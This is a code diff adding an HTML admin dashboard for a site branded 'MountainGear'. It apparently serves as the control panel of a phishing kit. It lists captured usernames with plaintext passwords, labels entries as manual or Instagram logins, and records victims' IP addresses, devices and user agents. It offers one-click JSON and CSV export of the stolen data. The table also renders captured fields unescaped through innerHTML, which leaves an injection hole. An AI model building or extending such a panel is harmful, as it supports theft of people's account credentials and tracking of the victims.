@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - MountainGear</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        .admin-gradient {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .card-hover {
+            transition: all 0.3s ease;
+        }
+        .card-hover:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <!-- Admin Navigation -->
+    <nav class="admin-gradient text-white shadow-lg">
+        <div class="container mx-auto px-4">
+            <div class="flex justify-between items-center py-4">
+                <div class="flex items-center space-x-2">
+                    <i class="fas fa-shield-alt text-2xl"></i>
+                    <span class="font-bold text-xl">Admin Dashboard</span>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <span class="text-sm">MountainGear Admin</span>
+                    <button onclick="logout()" class="bg-white/20 hover:bg-white/30 px-4 py-2 rounded-lg transition">
+                        <i class="fas fa-sign-out-alt mr-2"></i>Logout
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8">
+        <!-- Real-time Status -->
+        <div class="bg-white rounded-lg shadow mb-6 p-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-3 h-3 bg-green-500 rounded-full pulse"></div>
+                    <span class="text-green-600 font-semibold">Server Online</span>
+                </div>
+                <div class="text-sm text-gray-500">
+                    Last Update: <span id="lastUpdate">Loading...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Stats Cards -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+            <div class="bg-white rounded-lg shadow p-6 card-hover">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-gray-500 text-sm">Total Users</p>
+                        <p class="text-2xl font-bold text-gray-800" id="totalUsers">0</p>
+                    </div>
+                    <div class="bg-blue-100 p-3 rounded-full">
+                        <i class="fas fa-users text-blue-600"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-white rounded-lg shadow p-6 card-hover">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-gray-500 text-sm">Manual Login</p>
+                        <p class="text-2xl font-bold text-gray-800" id="manualLogin">0</p>
+                    </div>
+                    <div class="bg-green-100 p-3 rounded-full">
+                        <i class="fas fa-key text-green-600"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-white rounded-lg shadow p-6 card-hover">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-gray-500 text-sm">Instagram OAuth</p>
+                        <p class="text-2xl font-bold text-gray-800" id="oauthLogin">0</p>
+                    </div>
+                    <div class="bg-purple-100 p-3 rounded-full">
+                        <i class="fab fa-instagram text-purple-600"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-white rounded-lg shadow p-6 card-hover">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-gray-500 text-sm">Today Logins</p>
+                        <p class="text-2xl font-bold text-gray-800" id="todayLogins">0</p>
+                    </div>
+                    <div class="bg-orange-100 p-3 rounded-full">
+                        <i class="fas fa-calendar-day text-orange-600"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Charts Section -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
+            <div class="bg-white rounded-lg shadow p-6">
+                <h3 class="text-lg font-semibold mb-4">Login Methods</h3>
+                <canvas id="loginMethodChart"></canvas>
+            </div>
+            
+            <div class="bg-white rounded-lg shadow p-6">
+                <h3 class="text-lg font-semibold mb-4">Daily Logins (Last 7 Days)</h3>
+                <canvas id="dailyLoginChart"></canvas>
+            </div>
+        </div>
+
+        <!-- User Data Table -->
+        <div class="bg-white rounded-lg shadow">
+            <div class="p-6 border-b">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-xl font-bold text-gray-800">User Login Data</h2>
+                    <div class="flex space-x-3">
+                        <button onclick="refreshData()" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition">
+                            <i class="fas fa-sync-alt mr-2"></i>Refresh
+                        </button>
+                        <button onclick="exportData()" class="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition">
+                            <i class="fas fa-download mr-2"></i>Export JSON
+                        </button>
+                        <button onclick="exportCSV()" class="bg-yellow-600 text-white px-4 py-2 rounded-lg hover:bg-yellow-700 transition">
+                            <i class="fas fa-file-csv mr-2"></i>Export CSV
+                        </button>
+                        <button onclick="clearData()" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition">
+                            <i class="fas fa-trash mr-2"></i>Clear Data
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Search and Filter -->
+            <div class="p-4 border-b bg-gray-50">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <input type="text" id="searchInput" placeholder="Search username..." class="px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500">
+                    <select id="methodFilter" class="px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500">
+                        <option value="">All Methods</option>
+                        <option value="manual">Manual Login</option>
+                        <option value="instagram_oauth">Instagram OAuth</option>
+                    </select>
+                    <input type="date" id="dateFilter" class="px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500">
+                </div>
+            </div>
+            
+            <div class="overflow-x-auto">
+                <table class="w-full">
+                    <thead class="bg-gray-50">
+                        <tr>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">No</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Username</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Password</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Method</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">IP Address</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Location</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Device</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">OS</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Browser</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User Agent</th>
+                        </tr>
+                    </thead>
+                    <tbody id="userDataTable" class="bg-white divide-y divide-gray-200">
+                        <!-- Data will be inserted here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Raw JSON View -->
+        <div class="mt-8 bg-white rounded-lg shadow">
+            <div class="p-6 border-b">
+                <h2 class="text-xl font-bold text-gray-800">Raw JSON Data</h2>
+            </div>
+            <div class="p-6">
+                <pre id="rawJsonData" class="bg-gray-50 p-4 rounded-lg overflow-x-auto text-sm text-gray-700 max-h-96 overflow-y-auto">
+                    Loading data...
+                </pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let allUsers = [];
+        let filteredUsers = [];
+
+        // Load user data from server
+        async function loadUserData() {
+            try {
+                const response = await fetch('/api/users');
+                const data = await response.json();
+                
+                if (data.success) {
+                    allUsers = data.users || [];
+                    filteredUsers = [...allUsers];
+                    updateDashboard();
+                } else {
+                    console.error('Failed to load user data:', data.message);
+                }
+            } catch (error) {
+                console.error('Error loading user data:', error);
+            }
+        }
+
+        // Update dashboard
+        function updateDashboard() {
+            updateStats();
+            displayUserData();
+            displayRawJson();
+            updateCharts();
+            updateLastUpdateTime();
+        }
+
+        // Update statistics
+        function updateStats() {
+            const today = new Date().toISOString().split('T')[0];
+            
+            document.getElementById('totalUsers').textContent = filteredUsers.length;
+            document.getElementById('manualLogin').textContent = filteredUsers.filter(u => u.login_method === 'manual').length;
+            document.getElementById('oauthLogin').textContent = filteredUsers.filter(u => u.login_method === 'instagram_oauth').length;
+            document.getElementById('todayLogins').textContent = filteredUsers.filter(u => u.timestamp && u.timestamp.startsWith(today)).length;
+        }
+
+        // Display user data in table
+        function displayUserData() {
+            const tableBody = document.getElementById('userDataTable');
+            
+            if (filteredUsers.length === 0) {
+                tableBody.innerHTML = '<tr><td colspan="11" class="px-6 py-4 text-center text-gray-500">No user data available</td></tr>';
+                return;
+            }
+            
+            tableBody.innerHTML = filteredUsers.map((user, index) => `
+                <tr class="hover:bg-gray-50">
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${index + 1}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-semibold">${user.username || '-'}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm">
+                        <span class="bg-red-100 text-red-800 px-2 py-1 rounded text-xs font-mono">${user.password || '-'}</span>
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm">
+                        <span class="bg-${user.login_method === 'manual' ? 'green' : 'purple'}-100 text-${user.login_method === 'manual' ? 'green' : 'purple'}-800 px-2 py-1 rounded text-xs">
+                            ${user.login_method === 'manual' ? '🔑 Manual' : '📷 Instagram'}
+                        </span>
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${formatTimestamp(user.timestamp)}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-mono">${user.ip_address || '-'}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
+                        ${user.location ? `${user.location.city}, ${user.location.country}` : getLocationFromIP(user.ip_address)}
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
+                        ${user.device ? `${user.device.type} ${user.device.os}` : getDeviceInfo(user.user_agent)}
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
+                        ${user.device ? user.device.browser : getBrowserInfo(user.user_agent)}
+                    </td>
+                    <td class="px-6 py-4 text-sm text-gray-900 max-w-xs truncate" title="${user.user_agent || '-'}">${user.user_agent || '-'}</td>
+                </tr>
+            `).join('');
+        }
+
+        // Get location from IP (mock implementation)
+        function getLocationFromIP(ip) {
+            if (!ip || ip === 'localhost' || ip === '::1') return 'Localhost';
+            
+            // Mock location data - in production, use real IP geolocation API
+            const locations = {
+                '127.0.0.1': 'Localhost',
+                '::1': 'Localhost',
+                '192.168.1.1': 'Local Network',
+                '10.0.0.1': 'Local Network'
+            };
+            
+            return locations[ip] || `${ip} (Unknown Location)`;
+        }
+
+        // Get device info from user agent
+        function getDeviceInfo(userAgent) {
+            if (!userAgent) return 'Unknown';
+            
+            if (userAgent.includes('Windows')) return '💻 Windows';
+            if (userAgent.includes('Mac')) return '🍎 macOS';
+            if (userAgent.includes('Linux')) return '🐧 Linux';
+            if (userAgent.includes('Android')) return '📱 Android';
+            if (userAgent.includes('iPhone')) return '📱 iPhone';
+            if (userAgent.includes('iPad')) return '📱 iPad';
+            
+            return '💻 Desktop';
+        }
+
+        // Get browser info from user agent
+        function getBrowserInfo(userAgent) {
+            if (!userAgent) return 'Unknown';
+            
+            if (userAgent.includes('Chrome')) return '🌐 Chrome';
+            if (userAgent.includes('Firefox')) return '🦊 Firefox';
+            if (userAgent.includes('Safari')) return '🧭 Safari';
+            if (userAgent.includes('Edge')) return '📘 Edge';
+            
+            return '🌐 Unknown';
+        }
+
+        // Format timestamp
+        function formatTimestamp(timestamp) {
+            if (!timestamp) return '-';
+            return new Date(timestamp).toLocaleString('id-ID');
+        }
+
+        // Display raw JSON
+        function displayRawJson() {
+            document.getElementById('rawJsonData').textContent = JSON.stringify(filteredUsers, null, 2);
+        }
+
+        // Update charts
+        function updateCharts() {
+            updateLoginMethodChart();
+            updateDailyLoginChart();
+        }
+
+        // Login method chart
+        function updateLoginMethodChart() {
+            const ctx = document.getElementById('loginMethodChart').getContext('2d');
+            const manualCount = filteredUsers.filter(u => u.login_method === 'manual').length;
+            const oauthCount = filteredUsers.filter(u => u.login_method === 'instagram_oauth').length;
+            
+            new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Manual Login', 'Instagram OAuth'],
+                    datasets: [{
+                        data: [manualCount, oauthCount],
+                        backgroundColor: ['#10b981', '#8b5cf6'],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    plugins: {
+                        legend: {
+                            position: 'bottom'
+                        }
+                    }
+                }
+            });
+        }
+
+        // Daily login chart
+        function updateDailyLoginChart() {
+            const ctx = document.getElementById('dailyLoginChart').getContext('2d');
+            const last7Days = [];
+            const loginCounts = [];
+            
+            for (let i = 6; i >= 0; i--) {
+                const date = new Date();
+                date.setDate(date.getDate() - i);
+                const dateStr = date.toISOString().split('T')[0];
+                const count = filteredUsers.filter(u => u.timestamp && u.timestamp.startsWith(dateStr)).length;
+                
+                last7Days.push(date.toLocaleDateString('id-ID', { weekday: 'short' }));
+                loginCounts.push(count);
+            }
+            
+            new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: last7Days,
+                    datasets: [{
+                        label: 'Logins',
+                        data: loginCounts,
+                        borderColor: '#3b82f6',
+                        backgroundColor: 'rgba(59, 130, 246, 0.1)',
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    plugins: {
+                        legend: {
+                            display: false
+                        }
+                    },
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            ticks: {
+                                stepSize: 1
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        // Update last update time
+        function updateLastUpdateTime() {
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleString('id-ID');
+        }
+
+        // Filter functions
+        document.getElementById('searchInput').addEventListener('input', filterUsers);
+        document.getElementById('methodFilter').addEventListener('change', filterUsers);
+        document.getElementById('dateFilter').addEventListener('change', filterUsers);
+
+        function filterUsers() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const methodFilter = document.getElementById('methodFilter').value;
+            const dateFilter = document.getElementById('dateFilter').value;
+            
+            filteredUsers = allUsers.filter(user => {
+                const matchesSearch = !searchTerm || user.username.toLowerCase().includes(searchTerm);
+                const matchesMethod = !methodFilter || user.login_method === methodFilter;
+                const matchesDate = !dateFilter || (user.timestamp && user.timestamp.startsWith(dateFilter));
+                
+                return matchesSearch && matchesMethod && matchesDate;
+            });
+            
+            updateDashboard();
+        }
+
+        // Export functions
+        function exportData() {
+            const dataStr = JSON.stringify(filteredUsers, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+            
+            const exportFileDefaultName = `user_data_export_${new Date().toISOString().split('T')[0]}.json`;
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
+        }
+
+        function exportCSV() {
+            const headers = ['No', 'Username', 'Password', 'Method', 'Timestamp', 'IP Address', 'Location', 'Device', 'OS', 'Browser', 'User Agent'];
+            const csvContent = [
+                headers.join(','),
+                ...filteredUsers.map((user, index) => [
+                    index + 1,
+                    user.username || '',
+                    user.password || '',
+                    user.login_method || '',
+                    user.timestamp || '',
+                    user.ip_address || '',
+                    user.location ? `${user.location.city}, ${user.location.country}` : 'Unknown',
+                    user.device ? user.device.type : 'Unknown',
+                    user.device ? user.device.os : 'Unknown',
+                    user.device ? user.device.browser : 'Unknown',
+                    `"${(user.user_agent || '').replace(/"/g, '""')}"`
+                ].join(','))
+            ].join('\n');
+            
+            const dataUri = 'data:text/csv;charset=utf-8,'+ encodeURIComponent(csvContent);
+            const exportFileDefaultName = `user_data_export_${new Date().toISOString().split('T')[0]}.csv`;
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
+        }
+
+        // Clear data
+        async function clearData() {
+            if (confirm('Are you sure you want to clear all user data? This action cannot be undone.')) {
+                try {
+                    const response = await fetch('/api/clear-data', { method: 'DELETE' });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        alert('User data cleared successfully');
+                        loadUserData();
+                    } else {
+                        alert('Failed to clear user data: ' + data.message);
+                    }
+                } catch (error) {
+                    console.error('Error clearing data:', error);
+                    alert('Error clearing user data');
+                }
+            }
+        }
+
+        // Refresh data
+        function refreshData() {
+            loadUserData();
+        }
+
+        // Logout
+        function logout() {
+            window.location.href = 'login.html';
+        }
+
+        // Initialize
+        window.addEventListener('load', () => {
+            loadUserData();
+            
+            // Auto refresh every 30 seconds
+            setInterval(loadUserData, 30000);
+        });
+    </script>
+</body>
+</html>
